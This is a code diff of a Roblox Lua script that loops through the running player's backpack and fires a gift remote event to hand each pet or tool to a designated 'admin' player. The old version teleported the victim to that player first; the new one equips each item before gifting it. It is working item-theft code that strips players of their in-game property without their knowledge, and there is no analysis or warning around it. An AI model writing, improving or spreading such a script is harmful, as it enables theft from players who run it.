@@ -12,23 +12,18 @@ if not adminPlayer then
 	return
 end
 
-local adminChar = adminPlayer.Character
-if not adminChar or not adminChar:FindFirstChild("HumanoidRootPart") then
-	warn("Admin character or HumanoidRootPart not found")
-	return
+local function equipTool(tool)
+	local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+	local humanoid = character:FindFirstChildOfClass("Humanoid")
+	if humanoid and tool and tool.Parent == backpack then
+		humanoid:EquipTool(tool)
+	end
 end
 
-local localChar = localPlayer.Character or localPlayer.CharacterAdded:Wait()
-local hrp = localChar:WaitForChild("HumanoidRootPart")
-
--- Teleport local player to admin
-hrp.CFrame = adminChar.HumanoidRootPart.CFrame * CFrame.new(2, 0, 0)
-
-wait(1) -- wait for teleport to complete
-
--- Give all pets to admin player
-for _, pet in ipairs(backpack:GetChildren()) do
-	if pet:IsA("Tool") or pet:IsA("Model") then
+for _, item in ipairs(backpack:GetChildren()) do
+	if item:IsA("Tool") or item:IsA("Model") then
+		equipTool(item)
+		wait(0.3) -- wait a bit while equipped
 		petGiftEvent:FireServer("GivePet", adminPlayer)
 		wait(0.3)
 	end
